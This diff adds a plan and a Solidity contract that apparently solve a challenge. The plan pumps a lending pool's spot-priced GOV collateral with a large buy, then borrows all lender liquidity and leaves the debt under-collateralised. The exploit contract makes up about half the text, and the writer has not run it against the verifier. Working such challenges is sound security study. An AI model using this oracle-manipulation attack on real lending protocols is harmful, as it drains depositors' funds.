@@ -1,0 +1,38 @@
+The pool prices GOV from its own spot reserves, and `borrow` trusts that price for collateral value. The plan is to pump the price with a large buy, borrow against the inflated collateral, and leave the debt under-collateralised at the fair price.
+
+1. Buy GOV with the full 10 ETH. This yields about 4,992 GOV and raises the spot price to about 0.004 ETH per GOV.
+2. Deposit all the GOV as collateral. At the pumped price `maxBorrow` is about 14.9 ETH, which exceeds the 10 ETH of liquidity.
+3. Borrow all 10 ETH supplied by the lenders.
+4. At the fair price, the collateral is worth about 4.99 ETH against 10 ETH of debt, so `totalCollateral * 0.001 ether / 1e18 >= totalDebt` fails.
+
+A patched pool that doesn't trust the manipulable spot price would reject the borrow, so the invariant would still hold there. I have not run this against the verifier.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.28;
+
+interface ILendPool {
+    function buyGov() external payable;
+    function depositCollateral(uint amount) external;
+    function borrow(uint amount) external;
+    function govOf(address) external view returns (uint);
+    function totalSupplied() external view returns (uint);
+}
+
+contract Exploit {
+    ILendPool pool;
+
+    constructor(address target) payable {
+        pool = ILendPool(target);
+    }
+
+    function run() external {
+        pool.buyGov{value: address(this).balance}();
+        uint g = pool.govOf(address(this));
+        pool.depositCollateral(g);
+        pool.borrow(pool.totalSupplied());
+    }
+
+    receive() external payable {}
+}
+```
